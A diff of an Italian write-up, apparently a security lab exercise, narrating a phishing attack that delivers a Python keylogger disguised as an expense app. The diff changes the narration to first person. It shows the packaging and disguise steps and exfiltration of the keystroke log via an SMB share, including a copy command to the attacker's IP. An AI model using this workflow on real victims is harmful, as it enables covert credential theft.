@@ -110,20 +110,20 @@ Il Team di Gestore di Spesa
 
 </blockquote>
 
-Alessandro accede alla sua casella di posta, e legge la mail proviente dal team di Gestore Spese. Interessato all'opportunità decide di fare il download dell'allegato all'e-mail. Il file in questione si presenta con il nome di "Gestore di spesa.exe" che è il file malevolo creato dall'attacante.
+Alessandro accede alla sua casella di posta, e legge la mail proviente dal team di Gestore Spese. Interessato all'opportunità decide di fare il download dell'allegato all'e-mail. Il file in questione si presenta con il nome di "Gestore di spesa.exe" che è il file malevolo creato da me (l'attaccante).
 
 ### Programmazione del Keylogger e dell'interfaccia grafica del gestore
 
-L'attaccante programma il "Gestore di spesa" con Python e nel codice sorgente inserisce il keylogger.
-L'attaccante utilizza la libreria Tkinker di Python per la creazione dell'interfaccia grafica relativa allo script. Per come è strutturata l'applicazione alla chiusura il Keylogger si attiva, registra tutti i tasti premuti da alessandro e li salva in un file log.txt nella cartella C:\Windows\Temp scelta dall'attaccante. Il codice sottostante rappresenta l'applicazione completa e funzionante del "Gestore di spesa", la parte evidenziata dal quadrato rosso rappresenta solo il codice del keylogger:
+Ho programmato il "Gestore di spesa" con Python e nel codice sorgente ho inserito il keylogger.
+Ho utilizzato la libreria Tkinter di Python per la creazione dell'interfaccia grafica relativa allo script. Per come è strutturata l'applicazione alla chiusura il Keylogger si attiva, registra tutti i tasti premuti da alessandro e li salva in un file log.txt nella cartella C:\Windows\Temp da me scelta. Il codice sottostante rappresenta l'applicazione completa e funzionante del "Gestore di spesa", la parte evidenziata dal quadrato rosso rappresenta solo il codice del keylogger:
 
 ![Descrizione immagine](./images/Cod_compl.png)
 
-L'attaccante salva lo script .py in .pyw perchè questa seconda estensione permette di eseguire il programma senza aprire una finestra di console separata. Alla fine della programmazione l'attaccante trasforma lo script da .py a .exe sfruttando la libreria pyinstaller; essa prende lo script Python e genera un singolo file eseguibile che contiene tutte le dipendenze necessarie, inoltre, può essere eseguito su computer con Python non installato. L'attaccante sceglie una icona a suo piacimento e la converte in .ico, dopo aver caricato la libreria pyinstaller sul proprio sistema, esegue il seguente comando: 
+Ho salva lo script .py in .pyw perchè questa seconda estensione permette di eseguire il programma senza aprire una finestra di console separata. Alla fine della programmazione l'attaccante trasforma lo script da .py a .exe sfruttando la libreria pyinstaller; essa prende lo script Python e genera un singolo file eseguibile che contiene tutte le dipendenze necessarie, inoltre, può essere eseguito su computer con Python non installato. Ho scelto una icona a mio piacimento e l'ho converte in .ico, dopo aver caricato la libreria pyinstaller sul sistema, eseguo il seguente comando: 
 ```shell
 pyinstaller --onefile --icon=Icona.ico Gestore_di_spesa.py
 ```
-Questo comando creerà nella directory scelta dall'attaccante il file Gestore_di_spesa.exe con l'immagine scelta dall'attaccante. Successivamente l'attaccante per non destare sospetti, cambia il nome dell'eseguibile in "Manager Spesa".
+Questo comando creerà nella directory che ho scelto il file Gestore_di_spesa.exe con l'immagine Icona.ico da me scelta. Successivamente ho cambiato il nome dell'eseguibile in "Manager Spesa".
 
 ![Descrizione immagine](./images/file.exe.png)
 
@@ -153,25 +153,25 @@ Dopo aver chiuso il programma, il keylogger inizia a catturare tutte le informaz
 
 ---
 
-L'attaccante apetta un periodo di tempo ragionevole prima di estrarre il file con le informazioni. In seguito l'attaccante sfrutta il protocollo SMB per estrarre il file log.txt contenente le sequenze di tasti catturate.
+Dopo aver apettato un periodo di tempo ragionevole prima di estrarre il file con le informazioni, sfrutto il protocollo SMB per estrarre il file log.txt contenente le sequenze di tasti catturate.
 
 ### 1. Configurazione del Server SMB sull'Attaccante
 
-L'attaccante configura il server SMB utilizzando lo strumento impacket-smbserver per creare una condivisione di rete, tra il dispositivo del bersaglio e il proprio, che può essere acceduta dall'attaccante per copiare i file del bersaglio sul dispositivo dell'attaccante. Il comando seguente avvia il server SMB sul dispositivo dell'attaccante:
+Ho configurato il server SMB utilizzando lo strumento impacket-smbserver per creare una condivisione di rete, tra il dispositivo del bersaglio e il mio, alla quale posso accedere per copiare i file del bersaglio sul mio dispositivo. Il comando seguente avvia il server SMB sul mio computer:
 
 ![Descrizione immagine](./images/Inizio_SMB.jpg)
 
-Questo comando crea una condivisione SMB denominata hax nella directory corrente dell'attaccante nella quale l'attaccante può spostare i file della vittima.
+Questo comando crea una condivisione SMB denominata hax nella directory da me scelta nella quale posso spostare i file della vittima.
 
 ### 2. Navigazione sulla Macchina della Vittima
 
-Attraverso il protocollo SSH (scoperto precedentenente attivo sul dispositivo bersaglio con le relative credenziali valide), l'attaccante verifica la posizione del file log.txt generato dal keylogger. Il file è collocato nella directory C:\Windows\temp per costruzione del keylogger.
+Attraverso il protocollo SSH (scoperto precedentenente attivo sul dispositivo bersaglio con le relative credenziali valide), verifico la posizione del file log.txt generato dal keylogger. Il file è collocato nella directory C:\Windows\temp per costruzione del keylogger.
 
 ![Descrizione immagine](./images/Temp.png)
 
 ### 3. Copia del File log.txt tramite SMB
 
-L'attaccante utilizza il comando copy di Windows per copiare il file log.txt dalla macchina della vittima alla condivisione SMB sul dispositivo dell'attaccante. Ecco il comando eseguito sulla macchina della vittima attraverso SSH:
+Utilizzo il comando copy di Windows per copiare il file log.txt dalla macchina della vittima alla condivisione SMB sul mio dispositivo. Ecco il comando eseguito sulla macchina della vittima attraverso il protocollo SSH:
 
 ```cmd
 copy C:\Windows\temp\log.txt \\10.0.2.15\hax\log.txt
@@ -179,9 +179,9 @@ copy C:\Windows\temp\log.txt \\10.0.2.15\hax\log.txt
 
 ![Descrizione immagine](./images/Dopocopia.png)
 
-Dove 10.0.2.15 è l'indirizzo IP del dispositivo dell'attaccante.
+Dove 10.0.2.15 è l'indirizzo IP del mio dispositivo.
 
-L'attaccante può verificare che lo spostamento del file è avvenuto nel terminale che ha usato per creare la condivisione SMB:
+Posso verificare che lo spostamento del file è avvenuto nel terminale che ha usato per creare la condivisione SMB:
 
 ![Descrizione immagine](./images/verificata_connessione.png)
 
@@ -189,7 +189,7 @@ Esempio del file log.txt ottenuto:
 
 ![Descrizione immagine](./images/log.txt.png)
 
-Dai tasti digitati da Alessandro l'attaccante può supporre che il bersaglio abbia visitato un sito di nome "intesa" e che "AlessandroFV" sia lo username, mentre "gigipolpetta" sia la password.
+Dai tasti digitati da Alessandro posso supporre che il bersaglio abbia visitato un sito di nome "intesa" e che "AlessandroFV" sia lo username, mentre "gigipolpetta" sia la password.
 
 <br>
 
